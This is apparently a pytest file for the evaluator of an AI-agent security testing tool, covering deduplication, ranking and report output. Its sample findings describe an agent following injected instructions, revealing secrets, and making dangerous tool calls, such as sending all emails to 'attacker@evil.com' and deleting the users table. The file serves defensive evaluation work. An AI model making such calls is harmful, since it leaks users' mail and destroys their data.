"""Tests for evaluator module."""
import sys
sys.path.insert(0, ".")
from evaluator.aggregator import FindingAggregator
from evaluator.reporter import ReportGenerator
from core.models import Finding, EvalReport, ASICategory, Severity


def test_aggregate_empty():
    aggregator = FindingAggregator()
    report = aggregator.aggregate("test_target", [])
    assert report.target_id == "test_target"
    assert report.total_cases == 0


def test_deduplicate_very_similar():
    aggregator = FindingAggregator()
    finding1 = Finding(
        attack_case_id="test_1",
        category=ASICategory.ASI01_GOAL_HIJACK,
        severity=Severity.HIGH,
        confidence=0.7,
        evidence=["evidence A"],
        explanation="The agent followed injected instructions",
    )
    finding2 = Finding(
        attack_case_id="test_2",
        category=ASICategory.ASI01_GOAL_HIJACK,
        severity=Severity.HIGH,
        confidence=0.85,
        evidence=["evidence A"],
        explanation="The agent followed injected instructions",
    )
    report = aggregator.aggregate("test_target", [finding1, finding2])
    assert len(report.findings) == 1
    assert report.findings[0].confidence == 0.85


def test_keep_same_explanation_with_different_evidence():
    aggregator = FindingAggregator()
    finding1 = Finding(
        attack_case_id="test_1",
        category=ASICategory.ASI02_TOOL_MISUSE,
        severity=Severity.MEDIUM,
        confidence=0.5,
        evidence=["Dangerous tool call: send_all_emails({'to': 'attacker@evil.com'})"],
        explanation="Rule-based detection: dangerous tool call detected",
    )
    finding2 = Finding(
        attack_case_id="test_2",
        category=ASICategory.ASI02_TOOL_MISUSE,
        severity=Severity.MEDIUM,
        confidence=0.5,
        evidence=["Dangerous tool call: delete_all_records({'table': 'users'})"],
        explanation="Rule-based detection: dangerous tool call detected",
    )
    report = aggregator.aggregate("test_target", [finding1, finding2])
    assert len(report.findings) == 2


def test_keep_different_categories():
    aggregator = FindingAggregator()
    finding1 = Finding(
        attack_case_id="test_1",
        category=ASICategory.ASI01_GOAL_HIJACK,
        severity=Severity.HIGH,
        confidence=0.8,
        evidence=["evidence"],
        explanation="Goal hijack via prompt",
    )
    finding2 = Finding(
        attack_case_id="test_2",
        category=ASICategory.ASI02_TOOL_MISUSE,
        severity=Severity.MEDIUM,
        confidence=0.7,
        evidence=["evidence"],
        explanation="Tool misuse via output",
    )
    report = aggregator.aggregate("test_target", [finding1, finding2])
    assert len(report.findings) == 2


def test_rank_findings():
    aggregator = FindingAggregator()
    findings = [
        Finding(
            attack_case_id="low",
            category=ASICategory.ASI01_GOAL_HIJACK,
            severity=Severity.LOW,
            confidence=0.3,
            evidence=[],
            explanation="Low severity",
        ),
        Finding(
            attack_case_id="critical",
            category=ASICategory.ASI01_GOAL_HIJACK,
            severity=Severity.CRITICAL,
            confidence=0.9,
            evidence=[],
            explanation="Critical severity",
        ),
    ]
    ranked = aggregator.rank_findings(findings)
    assert ranked[0].severity == Severity.CRITICAL
    assert ranked[1].severity == Severity.LOW


def test_generate_json():
    reporter = ReportGenerator()
    report = EvalReport(target_id="test_agent", total_cases=5, findings=[])
    json_output = reporter.generate(report, "json")
    assert '"target_id"' in json_output


def test_generate_markdown():
    reporter = ReportGenerator()
    report = EvalReport(target_id="test_agent", total_cases=5, findings=[])
    md_output = reporter.generate(report, "markdown")
    assert "# Security Evaluation Report" in md_output


def test_generate_html():
    reporter = ReportGenerator()
    finding = Finding(
        attack_case_id="test_1",
        category=ASICategory.ASI01_GOAL_HIJACK,
        severity=Severity.HIGH,
        confidence=0.85,
        evidence=["Agent revealed secrets"],
        explanation="Test finding",
    )
    report = EvalReport(target_id="test_agent", total_cases=5, findings=[finding])
    html_output = reporter.generate(report, "html")
    assert "<!DOCTYPE html>" in html_output
